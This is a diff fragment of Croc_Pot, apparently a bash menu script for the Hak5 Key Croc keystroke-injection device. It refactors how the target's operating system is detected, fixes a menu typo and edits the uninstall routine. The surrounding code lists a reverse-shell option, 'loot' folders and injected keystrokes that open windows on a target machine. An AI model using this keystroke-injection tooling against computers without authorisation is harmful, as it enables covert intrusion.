 MenuColor 11 REVERSE SHELL ; echo -ne "           ${clear}\n"
-MenuColor 12 CREATE PUBLIN/PRIVATE KEY ; echo -ne "${clear}\n"
+MenuColor 12 CREATE PUBLIC/PRIVATE KEY ; echo -ne "${clear}\n"
 MenuColor 13 RETURN TO MAIN MENU ; echo -ne "       ${clear}\n"
 MenuEnd
 	unset m_a
@@ -4908,9 +4888,7 @@ fi
 ##
 hak_factory() {
 	echo -ne "\n\e[40m$(ColorYellow 'Open Hak5 factory recovery web page')\n${clear}"
-	local CROC_OS=/root/udisk/loot/Croc_OS.txt
-	local OS_CHECK=$(sed -n 1p ${CROC_OS})
-if [ "${OS_CHECK}" = WINDOWS ]; then
+if [ "$(OS_CHECK)" = WINDOWS ]; then
 	Q GUI d
 	Q GUI r
 	sleep 1
@@ -4925,7 +4903,7 @@ if [ "${OS_CHECK}" = WINDOWS ]; then
 	Q STRING "exit"
 	Q ENTER
 else
-	local HOST_CHECK=$(sed -n 3p ${CROC_OS})
+	local HOST_CHECK=$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)
 	case $HOST_CHECK in
 	raspberrypi)
 		Q GUI d
@@ -5027,13 +5005,13 @@ remove_croc_pot() {
 	echo -ne "\e[40m$(ColorRed 'ARE YOU SURE YOU WANT TO REMOVE CROCPOT TYPE YES OR NO AND PRESS [ENTER]:')${clear} "; read CROC_POT_REMOVE
 	case $CROC_POT_REMOVE in
 	[yY] | [yY][eE][sS])
-		apt -y remove unzip openvpn sshpass mc nmon
+		apt -y remove unzip openvpn mc nmon
 		rm -r /var/hak5c2 /root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot/Bunny_Payload_Shell /root/udisk/tools/Croc_Pot
 		rm /usr/local/bin/c2-3.1.2_armv7_linux /etc/systemd/system/hak5.service
 		rm /root/udisk/tools/kc_fw_1.3_510.tar.gz /root/udisk/payloads/Croc_Pot_Payload.txt
 		rm /root/udisk/payloads/Croc_unlock_1.txt /root/udisk/payloads/Croc_unlock_2.txt
 		rm /root/udisk/payloads/Getonline.txt /root/udisk/payloads/Quick_Start_C2.txt
-		rm /root/udisk/loot/Croc_OS.txt /root/udisk/loot/Croc_OS_ip.txt /root/udisk/loot/Croc_OS_wind.txt
+		rm /root/udisk/tools/Croc_Pot/Croc_OS.txt /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt
 		rm /root/udisk/tools/Croc_Pot.sh /root/udisk/payloads/Croc_Shot.txt /root/udisk/payloads/Croc_Shell.txt
 		apt-get autoremove
 		exit 0 ;;
@@ -5145,9 +5123,7 @@ fi
 #----Hak5 Cloud_C2 start web brower
 ##
 start_web() {
-	local CROC_OS=/root/udisk/loot/Croc_OS.txt
-	local OS_CHECK=$(sed -n 1p ${CROC_OS})
-if [ "${OS_CHECK}" = WINDOWS ]; then
+if [ "$(OS_CHECK)" = WINDOWS ]; then
 	Q GUI d
 	Q GUI r
 	sleep 1
@@ -5162,7 +5138,7 @@ if [ "${OS_CHECK}" = WINDOWS ]; then
 	Q STRING "exit"
 	Q ENTER
 else
-	local HOST_CHECK=$(sed -n 3p ${CROC_OS})
+	local HOST_CHECK=$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)
 	case $HOST_CHECK in
 	raspberrypi)
 	Q GUI d
